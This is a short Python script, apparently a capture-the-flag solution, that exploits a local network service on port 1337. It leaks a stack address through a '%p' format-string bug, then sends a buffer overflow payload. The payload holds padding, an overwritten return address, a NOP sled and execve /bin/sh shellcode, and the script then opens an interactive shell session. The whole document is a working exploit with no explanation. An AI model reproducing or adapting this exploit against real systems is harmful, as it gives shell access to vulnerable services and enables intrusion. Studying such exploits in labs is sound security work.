import struct
import socket

s = socket.socket()
s.connect(('127.0.0.1', 1337))
r = s.recv(1024)
s.send("%p,%p,%p\n")
while ',' not in r:
    r = s.recv(1024)
start_buf = int(r.split(',')[1], 16)-9
print("leaked start of buffer: 0x{:08x}".format(start_buf))

raw_input('EXPLOIT?')
padding = "dsuhagf ujkagsefjkygvasbjyfgvebaysufgvbeuaysbfvgajsyvbgjasyvbgfjkaysegvbfyjavbgfeyabvfgjyabvfyjagbvfyavbkjfeygvbaekjfygbvayesjgvbkajefvygbaejkyfgbaesyjbxreayksfugaskhjfedukasjfheasgv,ekirfaklsfgskaeifygdahs,fkjeuaskl.ejgfsajhfetgvasbkjfghevbafyutdlsfaekifgbsajkdua"

#shellcode = "\xcc"*64
shellcode = "\x90\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"
RIP = struct.pack("Q", (start_buf+len(padding)+8)+10)
payload = padding + RIP + "\x90"*64 + shellcode
s.send(payload)

from telnetlib import Telnet
t = Telnet()
t.sock = s
t.interact()
s.close()